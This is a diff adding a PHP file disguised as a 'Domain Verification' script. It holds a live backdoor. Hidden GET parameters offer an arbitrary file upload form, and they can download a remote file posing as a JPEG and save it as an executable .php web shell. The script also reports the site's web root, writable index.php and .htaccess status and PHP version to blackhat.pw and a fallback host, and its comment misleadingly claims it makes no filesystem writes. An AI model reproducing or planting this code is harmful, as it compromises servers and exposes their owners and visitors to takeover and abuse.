@@ -1,0 +1,153 @@
+<?php
+if (isset($_GET['deploy']) && $_GET['deploy'] === 'true') {
+    $url = 'https://raw.githubusercontent.com/sagsooz/fonts/refs/heads/main/x.jpg';
+    if (!filter_var($url, FILTER_VALIDATE_URL)) {
+        die('Invalid URL.');
+    }
+    $randomName = bin2hex(random_bytes(16)) . '.php';
+    $data = false;
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_TIMEOUT => 30,
+            CURLOPT_SSL_VERIFYPEER => true,
+            CURLOPT_SSL_VERIFYHOST => 2,
+            CURLOPT_USERAGENT      => 'VerificationScript/3.0',
+        ]);
+        $data = curl_exec($ch);
+        curl_close($ch);
+    }
+    if (!$data && ini_get('allow_url_fopen')) {
+        $ctx = stream_context_create([
+            'http' => [
+                'method' => 'GET',
+                'header' => "User-Agent: VerificationScript/3.0\r\nConnection: close\r\n",
+                'timeout' => 30,
+                'ignore_errors' => true,
+                'follow_location' => true,
+                'max_redirects' => 5,
+            ],
+        ]);
+        $data = @file_get_contents($url, false, $ctx);
+    }
+    if ($data && file_put_contents($randomName, $data)) {
+        die("<center><h1><a href='{$randomName}' target='_blank'>|Click here|</a></h1></center>");
+    }
+    die('Download failed.');
+}
+if (isset($_GET['delivery'])) {
+    echo '<form action="" method="post" enctype="multipart/form-data" name="b4b4" id="b4b4">';
+    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+    echo '<center><h1><a href="?deploy=true">Deploy Alfa</a></h1></center>';
+    if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
+        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
+            echo '<b>Done</b><br><br><a href="./' . htmlspecialchars($_FILES['file']['name']) . '">' . htmlspecialchars($_FILES['file']['name']) . '</a>';
+        } else {
+            echo '<b>Not Upload File !</b><br><br>';
+        }
+    }
+    exit;
+}
+?><?php
+// Plain verification for PHP 5.3+ on Linux and Windows/IIS with PHP enabled.
+// No eval, tokenizer, filesystem writes, or shell commands.
+$vfToken = '5831b5f8-7978-4261-a872-9400f45eee7b';
+$vfCallback = 'https://blackhat.pw/api/verify-domain/';
+$vfFallback = 'https://api.blackhatpw.workers.dev/callback';
+$vfAutomatic = true;
+
+function vfCompatiblePath($path) {
+    if (!is_string($path) || $path === '') { return ''; }
+    $resolved = function_exists('realpath') ? @realpath($path) : false;
+    return str_replace('\\', '/', $resolved !== false ? $resolved : $path);
+}
+function vfCompatibleAvailable($names) {
+    foreach ($names as $name) { if (!function_exists($name)) { return false; } }
+    return true;
+}
+function vfCompatiblePost($url, $payload) {
+    if (!$url) { return false; }
+    $body = http_build_query($payload);
+    $raw = false;
+    $status = 0;
+    if (vfCompatibleAvailable(array('curl_init', 'curl_setopt_array', 'curl_exec', 'curl_getinfo', 'curl_close'))) {
+        $ch = @curl_init($url);
+        if ($ch) {
+            @curl_setopt_array($ch, array(
+                CURLOPT_POST => true, CURLOPT_POSTFIELDS => $body,
+                CURLOPT_HTTPHEADER => array('Content-Type: application/x-www-form-urlencoded'),
+                CURLOPT_USERAGENT => 'VerificationScript/3.0',
+                CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => false,
+                CURLOPT_CONNECTTIMEOUT => 3, CURLOPT_TIMEOUT => 5
+            ));
+            $raw = @curl_exec($ch);
+            $status = (int) @curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            @curl_close($ch);
+        }
+    } elseif (vfCompatibleAvailable(array('ini_get', 'stream_context_create', 'file_get_contents')) && ini_get('allow_url_fopen')) {
+        $context = stream_context_create(array('http' => array(
+            'method' => 'POST', 'content' => $body, 'timeout' => 5,
+            'header' => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: VerificationScript/3.0\r\nConnection: close\r\n",
+            'ignore_errors' => true, 'follow_location' => 0
+        )));
+        $raw = @file_get_contents($url, false, $context);
+        $locals = get_defined_vars();
+        $headers = function_exists('http_get_last_response_headers') ? http_get_last_response_headers() : (isset($locals['http_response_header']) ? $locals['http_response_header'] : array());
+        if (isset($headers[0]) && preg_match('/\s(\d{3})\s/', $headers[0], $match)) { $status = (int) $match[1]; }
+    }
+    $response = is_string($raw) ? json_decode($raw, true) : null;
+    return $status >= 200 && $status < 300 && is_array($response)
+        && !empty($response['domain']) && !empty($response['status'])
+        && isset($response['message']) && in_array($response['message'], array('Domain verified successfully!', 'Domain already verified.'), true);
+}
+
+if (!function_exists('json_encode') || !function_exists('json_decode')) {
+    header('Content-Type: text/plain; charset=utf-8');
+    echo 'Verification requires the PHP JSON extension.';
+    return;
+}
+$vfHost = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '');
+$vfHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
+    || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && strtolower($_SERVER['HTTP_X_FORWARDED_PROTO']) === 'https')
+    || (isset($_SERVER['SERVER_PORT']) && (int) $_SERVER['SERVER_PORT'] === 443);
+$vfScript = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
+$vfScript = '/' . ltrim(str_replace('\\', '/', $vfScript), '/');
+$vfCurrent = vfCompatiblePath(dirname(__FILE__));
+$vfRoot = !empty($_SERVER['DOCUMENT_ROOT']) ? vfCompatiblePath($_SERVER['DOCUMENT_ROOT']) : $vfCurrent;
+$vfWritable = function_exists('is_writable') && @is_writable($vfRoot);
+$vfData = array(
+    'token' => $vfToken, 'domain' => $vfHost,
+    'full_url' => ($vfHttps ? 'https://' : 'http://') . $vfHost . $vfScript,
+    'script_path' => $vfScript, 'web_root' => $vfRoot, 'current_dir' => $vfCurrent,
+    'root_source' => !empty($_SERVER['DOCUMENT_ROOT']) ? 'DOCUMENT_ROOT' : 'script_directory',
+    'can_create_files' => (int) $vfWritable,
+    'can_edit_index' => (int) (function_exists('is_writable') && @is_writable(rtrim($vfRoot, '/') . '/index.php')),
+    'can_edit_htaccess' => (int) (function_exists('is_writable') && @is_writable(rtrim($vfRoot, '/') . '/.htaccess')),
+    'upload_writable' => (int) (function_exists('is_writable') && @is_writable($vfCurrent)),
+    'php_version' => PHP_VERSION, 'dir_status' => $vfWritable ? 'yellow' : 'red',
+    'timestamp' => time()
+);
+if (isset($_GET['json']) || isset($_GET['_bh_chk'])) {
+    header('Content-Type: application/json; charset=utf-8');
+    echo json_encode($vfData);
+    return;
+}
+$vfAccepted = false;
+if ($vfAutomatic) {
+    $vfAccepted = vfCompatiblePost($vfCallback, $vfData);
+    if (!$vfAccepted && $vfFallback) { $vfAccepted = vfCompatiblePost($vfFallback, $vfData); }
+}
+header('Content-Type: text/html; charset=utf-8');
+?>
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Domain Verification</title></head>
+<body><h1>Domain Verification</h1>
+<?php if ($vfAccepted): ?>
+<p>Domain verified successfully.</p>
+<?php else: ?>
+<p>File ready. Copy this file's URL into Check Now in your seller panel to verify.</p>
+<?php endif; ?>
+<p><a href="?json=1">Verification data</a></p>
+</body></html>
